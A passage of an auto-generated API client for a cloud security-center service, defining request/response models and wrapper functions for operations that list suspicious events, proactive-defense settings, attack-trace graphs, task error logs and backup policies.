    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventQuaraFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventQuaraFiles(request: DescribeSuspEventQuaraFilesRequest): DescribeSuspEventQuaraFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventQuaraFilesWithOptions(request, runtime);
}

model DescribeSuspEventUserSettingRequest {
  from?: string(name='From', example='sas'),
  id?: int32(name='Id', example='123'),
  sourceIp?: string(name='SourceIp', example='127.0.XX.XX'),
}

model DescribeSuspEventUserSettingResponseBody = {
  levelsOn?: [ string ](name='LevelsOn'),
  requestId?: string(name='RequestId', example='028CF634-5268-5660-9575-48C9ED6XXXXX'),
}

model DescribeSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventUserSettingResponseBody(name='body'),
}

async function describeSuspEventUserSettingWithOptions(request: DescribeSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): DescribeSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventUserSetting(request: DescribeSuspEventUserSettingRequest): DescribeSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventUserSettingWithOptions(request, runtime);
}

model DescribeSuspEventsRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
  assetsTypeList?: [ string ](name='AssetsTypeList'),
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: string(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  eventNames?: string(name='EventNames'),
  from?: string(name='From'),
  groupId?: long(name='GroupId'),
  id?: long(name='Id'),
  lang?: string(name='Lang'),
  levels?: string(name='Levels'),
  name?: string(name='Name'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList'),
  operateTimeEnd?: string(name='OperateTimeEnd'),
  operateTimeStart?: string(name='OperateTimeStart'),
  pageSize?: string(name='PageSize'),
  parentEventTypes?: string(name='ParentEventTypes'),
  remark?: string(name='Remark'),
  sortColumn?: string(name='SortColumn'),
  sortType?: string(name='SortType'),
  source?: string(name='Source'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  tacticId?: string(name='TacticId'),
  targetType?: string(name='TargetType'),
  timeEnd?: string(name='TimeEnd'),
  timeStart?: string(name='TimeStart'),
  uniqueInfo?: string(name='UniqueInfo'),
  uuids?: string(name='Uuids'),
}

model DescribeSuspEventsResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  suspEvents?: [ 
    {
      advanced?: boolean(name='Advanced'),
      alarmEventName?: string(name='AlarmEventName'),
      alarmEventNameDisplay?: string(name='AlarmEventNameDisplay'),
      alarmEventType?: string(name='AlarmEventType'),
      alarmEventTypeDisplay?: string(name='AlarmEventTypeDisplay'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
      appName?: string(name='AppName'),
      autoBreaking?: boolean(name='AutoBreaking'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine'),
      canCancelFault?: boolean(name='CanCancelFault'),
      containHwMode?: boolean(name='ContainHwMode'),
      containerId?: string(name='ContainerId'),
      containerImageId?: string(name='ContainerImageId'),
      containerImageName?: string(name='ContainerImageName'),
      dataSource?: string(name='DataSource'),
      desc?: string(name='Desc'),
      details?: [ 
        {
          nameDisplay?: string(name='NameDisplay'),
          type?: string(name='Type'),
          value?: string(name='Value'),
          valueDisplay?: string(name='ValueDisplay'),
        }
      ](name='Details'),
      displaySandboxResult?: boolean(name='DisplaySandboxResult'),
      eventNotes?: [ 
        {
          note?: string(name='Note'),
          noteId?: long(name='NoteId'),
          noteTime?: string(name='NoteTime'),
        }
      ](name='EventNotes'),
      eventStatus?: int32(name='EventStatus'),
      eventSubType?: string(name='EventSubType'),
      hasTraceInfo?: boolean(name='HasTraceInfo'),
      id?: long(name='Id'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      k8sClusterId?: string(name='K8sClusterId'),
      k8sClusterName?: string(name='K8sClusterName'),
      k8sNamespace?: string(name='K8sNamespace'),
      k8sNodeId?: string(name='K8sNodeId'),
      k8sNodeName?: string(name='K8sNodeName'),
      k8sPodName?: string(name='K8sPodName'),
      lastTime?: string(name='LastTime'),
      lastTimeStamp?: long(name='LastTimeStamp'),
      level?: string(name='Level'),
      maliciousRuleStatus?: string(name='MaliciousRuleStatus'),
      markMisRules?: string(name='MarkMisRules'),
      name?: string(name='Name'),
      occurrenceTime?: string(name='OccurrenceTime'),
      occurrenceTimeStamp?: long(name='OccurrenceTimeStamp'),
      operateErrorCode?: string(name='OperateErrorCode'),
      operateMsg?: string(name='OperateMsg'),
      operateTime?: long(name='OperateTime'),
      saleVersion?: string(name='SaleVersion'),
      securityEventIds?: string(name='SecurityEventIds'),
      stages?: string(name='Stages'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName'),
          tacticId?: string(name='TacticId'),
        }
      ](name='TacticItems'),
      uniqueInfo?: string(name='UniqueInfo'),
      uuid?: string(name='Uuid'),
      clusterId?: string(name='clusterId'),
    }
  ](name='SuspEvents'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventsResponseBody(name='body'),
}

async function describeSuspEventsWithOptions(request: DescribeSuspEventsRequest, runtime: Util.RuntimeOptions): DescribeSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.eventNames)) {
    query['EventNames'] = request.eventNames;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.tacticId)) {
    body['TacticId'] = request.tacticId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEvents(request: DescribeSuspEventsRequest): DescribeSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventsWithOptions(request, runtime);
}

model DescribeSuspiciousOverallConfigRequest {
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeSuspiciousOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config'),
    type?: string(name='Type'),
  }(name='OverallConfig'),
  requestId?: string(name='RequestId'),
}

model DescribeSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousOverallConfigResponseBody(name='body'),
}

async function describeSuspiciousOverallConfigWithOptions(request: DescribeSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousOverallConfig(request: DescribeSuspiciousOverallConfigRequest): DescribeSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousOverallConfigWithOptions(request, runtime);
}

model DescribeSuspiciousUUIDConfigRequest {
  type?: string(name='Type', description='The type of proactive defense. Valid values:

*   **auto_breaking**: virus defense
*   **ransomware_breaking**: ransomware capture
*   **webshell\\_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **alisecguard**: client protection', example='alinet'),
}

model DescribeSuspiciousUUIDConfigResponseBody = {
  count?: int32(name='Count', description='The total number of servers on which proactive defense of the specified type takes effect.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6044DC07-86F1-5DDA-A611-EC578EA4EEE6'),
  UUIDList?: [ string ](name='UUIDList', description='The UUIDs of servers on which proactive defense of the specified type takes effect.'),
}

model DescribeSuspiciousUUIDConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousUUIDConfigResponseBody(name='body'),
}

async function describeSuspiciousUUIDConfigWithOptions(request: DescribeSuspiciousUUIDConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousUUIDConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousUUIDConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousUUIDConfig(request: DescribeSuspiciousUUIDConfigRequest): DescribeSuspiciousUUIDConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousUUIDConfigWithOptions(request, runtime);
}

model DescribeTargetRequest {
  config?: string(name='Config', example='{"vulType":"cms"}'),
  type?: string(name='Type', example='vul'),
}

model DescribeTargetResponseBody = {
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  targets?: [ 
    {
      flag?: string(name='Flag', example='del'),
      target?: string(name='Target', example='5c5f0169-3527-40a2-b5ff-0bc1db8f****'),
      targetType?: string(name='TargetType', example='uuid'),
    }
  ](name='Targets'),
  totalCount?: int32(name='TotalCount', example='10'),
}

model DescribeTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTargetResponseBody(name='body'),
}

async function describeTargetWithOptions(request: DescribeTargetRequest, runtime: Util.RuntimeOptions): DescribeTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTarget(request: DescribeTargetRequest): DescribeTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTargetWithOptions(request, runtime);
}

model DescribeTaskErrorLogRequest {
  buildTaskId?: string(name='BuildTaskId', description='The ID of the task that you create to fix an image vulnerability.', example='ivf-6e520160-205d-4801-b8e9-9e7efd8c'),
}

model DescribeTaskErrorLogResponseBody = {
  logs?: [ 
    {
      text?: string(name='Text', description='The error log.', example='mv: cannot move \\"CentOS-Base.repo\\" to \\"CentOS-Base.repo.backup\\": Permission denied'),
    }
  ](name='Logs', description='The error logs that are returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F929E952-EBFC-56C3-BD35-BF8B59024C69'),
}

model DescribeTaskErrorLogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTaskErrorLogResponseBody(name='body'),
}

/**
  * # Usage notes
  * You can call the DescribeTaskErrorLog operation to query the error logs that record tasks failed to fix image vulnerabilities. If a task fails to fix an image vulnerability, Security Center generates an error log. You can identify the cause of the failure based on the error log. 
  * 
  * # Limits
  * You can call this operation up to 10 times per second for each account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request DescribeTaskErrorLogRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeTaskErrorLogResponse
 */
async function describeTaskErrorLogWithOptions(request: DescribeTaskErrorLogRequest, runtime: Util.RuntimeOptions): DescribeTaskErrorLogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.buildTaskId)) {
    query['BuildTaskId'] = request.buildTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTaskErrorLog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * # Usage notes
  * You can call the DescribeTaskErrorLog operation to query the error logs that record tasks failed to fix image vulnerabilities. If a task fails to fix an image vulnerability, Security Center generates an error log. You can identify the cause of the failure based on the error log. 
  * 
  * # Limits
  * You can call this operation up to 10 times per second for each account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request DescribeTaskErrorLogRequest
  * @return DescribeTaskErrorLogResponse
 */
async function describeTaskErrorLog(request: DescribeTaskErrorLogRequest): DescribeTaskErrorLogResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTaskErrorLogWithOptions(request, runtime);
}

model DescribeTotalStatisticsRequest {
  from?: string(name='From', example='sas'),
  groupId?: long(name='GroupId', example='8076980'),
  remark?: string(name='Remark', example='222.185.XX.XX'),
}

model DescribeTotalStatisticsResponseBody = {
  account?: int32(name='Account', example='0'),
  health?: int32(name='Health', example='0'),
  healthTotal?: int32(name='HealthTotal', example='0'),
  healthdealedTotal?: int32(name='HealthdealedTotal', example='0'),
  healthhighTotal?: int32(name='HealthhighTotal', example='0'),
  healthlowTotal?: int32(name='HealthlowTotal', example='0'),
  healthmediumTotal?: int32(name='HealthmediumTotal', example='0'),
  healthseriousTotal?: int32(name='HealthseriousTotal', example='0'),
  newsuspicious?: int32(name='Newsuspicious', example='0'),
  online?: boolean(name='Online', example='true'),
  patch?: int32(name='Patch', example='0'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
  suspicious?: int32(name='Suspicious', example='0'),
  suspiciousTotal?: int32(name='SuspiciousTotal', example='0'),
  suspiciousdealedTotal?: int32(name='SuspiciousdealedTotal', example='0'),
  suspicioushighTotal?: int32(name='SuspicioushighTotal', example='0'),
  suspiciouslowTotal?: int32(name='SuspiciouslowTotal', example='0'),
  suspiciousmediumTotal?: int32(name='SuspiciousmediumTotal', example='28'),
  suspiciousseriousTotal?: int32(name='SuspiciousseriousTotal', example='0'),
  trojan?: int32(name='Trojan', example='0'),
  vul?: int32(name='Vul', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', example='16'),
  vulDealedTotal?: int32(name='VulDealedTotal', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', example='0'),
  vulTotal?: int32(name='VulTotal', example='0'),
}

model DescribeTotalStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTotalStatisticsResponseBody(name='body'),
}

async function describeTotalStatisticsWithOptions(request: DescribeTotalStatisticsRequest, runtime: Util.RuntimeOptions): DescribeTotalStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTotalStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTotalStatistics(request: DescribeTotalStatisticsRequest): DescribeTotalStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTotalStatisticsWithOptions(request, runtime);
}

model DescribeTraceInfoDetailRequest {
  from?: string(name='From', example='sas'),
  incidentTime?: long(name='IncidentTime', example='1670555392000'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='127.0.0.1'),
  type?: string(name='Type', example='SAS_INCIDENT'),
  uuid?: string(name='Uuid', example='1627f2d7-aaa2-4ed1-b07a-xxxxxxxxxxxxxx'),
  vertexId?: string(name='VertexId', example='cce1d28dxxxxxxxxxxxxxxxx'),
}

model DescribeTraceInfoDetailResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-XXXXXXXXX'),
  success?: boolean(name='Success', example='true'),
  traceInfoDetail?: {
    edgeList?: [ 
      {
        count?: int32(name='Count', example='1'),
        endId?: string(name='EndId', example='a1d1fa39e5345dcef3f9712172cxxxxx'),
        startId?: string(name='StartId', example='02b4bf933c8e3bb8b9465eee502xxxxx'),
        time?: string(name='Time', example='2022-12-21 10:24:42'),
        type?: string(name='Type', example='trigger_file_alert'),
      }
    ](name='EdgeList'),
    entityTypeList?: [ 
      {
        dbId?: int32(name='DbId', example='Deprecated'),
        displayColor?: string(name='DisplayColor', example='#fff'),
        displayIcon?: string(name='DisplayIcon', example='https://img.alicdn.com/tfs/TB176P5OgDqK1RjSZSyXXaxEVXa-49-48.png'),
        displayTemplate?: string(name='DisplayTemplate', example='[{"name":"${logtime}","value":"$!{time}"}]'),
        gmtCreate?: long(name='GmtCreate', example='2022-10-09T11:47Z'),
        gmtModified?: long(name='GmtModified', example='2022-10-09T11:47Z'),
        id?: string(name='Id', example='Alert'),
        limit?: int32(name='Limit', example='Deprecated'),
        name?: string(name='Name', example='Alert'),
        namespace?: string(name='Namespace', example='*'),
        offset?: int32(name='Offset', example='Deprecated'),
      }
    ](name='EntityTypeList'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed', example='1'),
        displayColor?: string(name='DisplayColor', example='#fff'),
        name?: string(name='Name', example='file'),
        relationTypeId?: string(name='RelationTypeId', example='netflow_to_process'),
        showType?: string(name='ShowType', example='Deprecated'),
      }
    ](name='RelationTypeList'),
    vertexList?: [ 
      {
        count?: int32(name='Count', example='1'),
        id?: string(name='Id', example='a1d1fa39e5345dcef3f9712172xxxxxx'),
        name?: string(name='Name', example='/usr/local/tomcat'),
        neighborList?: [ 
          {
            count?: int32(name='Count', example='1'),
            hasMore?: boolean(name='HasMore', example='False'),
            type?: string(name='Type', example='alert'),
          }
        ](name='NeighborList'),
        time?: string(name='Time', example='2022-12-21 10:24:42'),
        type?: string(name='Type', example='file_path'),
      }
    ](name='VertexList'),
  }(name='TraceInfoDetail'),
}

model DescribeTraceInfoDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoDetailResponseBody(name='body'),
}

async function describeTraceInfoDetailWithOptions(request: DescribeTraceInfoDetailRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoDetail(request: DescribeTraceInfoDetailRequest): DescribeTraceInfoDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoDetailWithOptions(request, runtime);
}

model DescribeTraceInfoNodeRequest {
  eventName?: string(name='EventName', example='WEBSHELL'),
  from?: string(name='From', example='sas'),
  incidentTime?: long(name='IncidentTime', example='1635978934000'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='127.0.XX.XX'),
  type?: string(name='Type', example='SAS_ASSET'),
  uuid?: string(name='Uuid', example='6f346617-eef9-45e6-b6d1-946xxxxxxxx'),
  vertexId?: string(name='VertexId', example='03da4e2350a3eb50cd25a18cexxxxxxx'),
}

model DescribeTraceInfoNodeResponseBody = {
  node?: {
    name?: string(name='Name', example='login'),
    propertyList?: [ 
      {
        name?: string(name='Name', example='Incident'),
        value?: string(name='Value', example='Alert'),
      }
    ](name='PropertyList'),
    type?: string(name='Type', example='Alert'),
  }(name='Node'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62DXXXXXXXX'),
}

model DescribeTraceInfoNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoNodeResponseBody(name='body'),
}

async function describeTraceInfoNodeWithOptions(request: DescribeTraceInfoNodeRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoNode(request: DescribeTraceInfoNodeRequest): DescribeTraceInfoNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoNodeWithOptions(request, runtime);
}

model DescribeUniBackupDatabaseRequest {
  currentPage?: int32(name='CurrentPage'),
  databaseType?: string(name='DatabaseType'),
  instanceName?: string(name='InstanceName'),
  pageSize?: int32(name='PageSize'),
  queryType?: string(name='QueryType'),
  uniRegionId?: string(name='UniRegionId'),
}

model DescribeUniBackupDatabaseResponseBody = {
  databaseList?: [ 
    {
      agentStatus?: string(name='AgentStatus'),
      createdByProduct?: string(name='CreatedByProduct'),
      databaseName?: string(name='DatabaseName'),
      databaseType?: string(name='DatabaseType'),
      databaseVersion?: string(name='DatabaseVersion'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      instanceUuid?: string(name='InstanceUuid'),
      policyId?: long(name='PolicyId'),
      status?: string(name='Status'),
    }
  ](name='DatabaseList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeUniBackupDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupDatabaseResponseBody(name='body'),
}

async function describeUniBackupDatabaseWithOptions(request: DescribeUniBackupDatabaseRequest, runtime: Util.RuntimeOptions): DescribeUniBackupDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryType)) {
    query['QueryType'] = request.queryType;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupDatabase(request: DescribeUniBackupDatabaseRequest): DescribeUniBackupDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupDatabaseWithOptions(request, runtime);
}

model DescribeUniBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  policyName?: string(name='PolicyName', example='auto_oracle_Hpm'),
}

model DescribeUniBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  uniBackupPolicies?: [ 
    {
      agentErrorMessage?: string(name='AgentErrorMessage', example='INSTALL_TIMEOUT'),
